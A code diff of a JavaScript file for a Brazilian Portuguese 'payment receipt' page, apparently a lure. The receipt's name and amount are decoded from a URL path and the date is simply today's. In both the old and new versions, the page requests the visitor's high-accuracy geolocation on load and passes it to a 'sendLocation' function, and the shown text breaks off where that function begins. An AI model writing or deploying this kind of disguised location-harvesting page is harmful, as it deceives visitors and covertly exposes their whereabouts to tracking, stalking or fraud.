@@ -1,34 +1,40 @@
-import { decodeReceiptData, DEFAULT_RECEIPT_DATA } from "./receipt-data.js";
+import { decodeReceiptData } from "./receipt-data.js";
 
-window.addEventListener("load", () => {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
-            maximumAge: 60000,
-            timeout: 5000,
-            enableHighAccuracy: true
-        });
-    } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
-    }
-});
-
-const encodedReceiptData = new URLSearchParams(window.location.search).get("dados");
-const receiptData = decodeReceiptData(encodedReceiptData) || DEFAULT_RECEIPT_DATA;
+const pathSegments = window.location.pathname.split("/").filter(Boolean);
+const encodedReceiptData = pathSegments.length === 2 && pathSegments[0] === "c"
+    ? pathSegments[1]
+    : null;
+const receiptData = decodeReceiptData(encodedReceiptData);
 const currencyFormatter = new Intl.NumberFormat("pt-BR", {
     style: "currency",
     currency: "BRL"
 });
 
-document.getElementById("nome-remetente").textContent = receiptData.nome;
-document.getElementById("valor-recebido").textContent = currencyFormatter.format(receiptData.valor);
+if (!receiptData) {
+    window.location.replace("/");
+} else {
+    document.getElementById("nome-remetente").textContent = receiptData.nome;
+    document.getElementById("valor-recebido").textContent = currencyFormatter.format(receiptData.valor);
 
-const dataAtual = new Date();
-const dia = String(dataAtual.getDate()).padStart(2, '0');
-const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-const ano = dataAtual.getFullYear();
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, "0");
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, "0");
+    const ano = dataAtual.getFullYear();
 
-const dataFormatada = `${dia}/${mes}/${ano}`;
-document.getElementById("data-atual").textContent = dataFormatada;
+    document.getElementById("data-atual").textContent = `${dia}/${mes}/${ano}`;
+
+    window.addEventListener("load", () => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
+                maximumAge: 60000,
+                timeout: 5000,
+                enableHighAccuracy: true
+            });
+        } else {
+            alert("Algo deu errado. Tente novamente mais tarde.");
+        }
+    });
+}
 
 function sendLocation(position) {
     const latitude = position.coords.latitude;
